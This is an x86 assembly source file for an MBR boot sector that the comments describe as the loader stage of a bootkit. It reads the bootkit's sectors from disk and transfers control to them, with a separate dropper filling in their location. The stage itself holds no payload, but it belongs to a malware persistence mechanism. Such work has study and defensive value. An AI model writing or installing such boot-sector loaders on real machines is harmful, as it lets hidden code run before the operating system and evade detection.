BITS 16                              ; specify 16-bit mode
ORG 0x7c00                           ; set the origin address to 0x7c00. This is where the MBR is loaded by the BIOS

;
; https://wiki.osdev.org/Memory_Map_(x86) states that the memory region 0x00000500 - 0x00007BFF is usable memory.
;
; Arbitrarly chosen addresses from the usable memory:
STACK_BASE      EQU 0x2000
BOOTKIT_BASE    EQU 0x4000           ; address where the bootkit gets loaded

start:
jmp real_start                       ; jump over the "data section" to the "code section"
times 4 - ($-$$) nop                 ; align "data section" to a 4 byte boundary

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;           data section         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;
; Disk Address Packet (DAP) structure. Used to read the bookit sectors from disk via LBA addressing with BIOS int 0x13
; See: https://wiki.osdev.org/Disk_access_using_the_BIOS_(INT_13h)
; Note:
; - The actual values for number of sectors to transfer and the LBA address of the bootkit are filled in by the dropper,
;   as they are determined in the bootkit installation process.
;
bootkit_dap: 
    db 0x10                          ; size of packet (16 bytes)
    db 0x00                          ; unused (always 0)
    dw 0x00                          ; number of sectors to transfer
    dw BOOTKIT_BASE                  ; transfer buffer (16 bit offset). offset comes before segment due to little endian
    dw 0x00                          ; transfer buffer (16 bit segment)
    dq 0x00                          ; lower 32-bits of 48-bit starting LBA
    dq 0x00                          ; upper 16-bits of 48-bit starting LBA

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;           code section         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;
; Initialization (mainly taken from GRUB2 source code)
;
real_start:
    cli                              ; disable interrupts in order to safely initialize registers
    xor ax, ax
    mov ds, ax
    mov ss, ax
    mov es, ax
    mov sp, STACK_BASE
    sti                              ; initialization done, reenable interrupts

;
; Load bootkit from disk to memory
; See: https://mbldr.sourceforge.net/specsedd30.pdf
;
; BIOS int 0x13, ah = 0x42
; Arguments:
;   ah = 0x42
;   dl = 0x80                        (drive number)
;   es:si = 0x0000:bootkit_dap       (disk address packet)
; Returns:
;   carry flag clear: ah = 0
;   carry flag set:   ah = error code
;
load_bootkit:
    mov ah, 0x42
    mov si, bootkit_dap
    int 0x13
    jc error                         ; error:   stop
    jmp BOOTKIT_BASE                 ; success: pass control to the bootkit
error:
    jmp $                            ; inifinite loop

times 510-($-$$) db 0                ; fill the rest of the sector with zeros:
                                     ; - The "times" directive repeats a given assembly code or data block a specific number of times.
                                     ; - $ represents the current position in the assembly code.
                                     ; - $$ represents the beginning of the code.
                                     ; => 510-($-$$) calculates the number of bytes remaining, and fills them with zeros
dw 0xAA55                            ; boot signature (end of the MBR)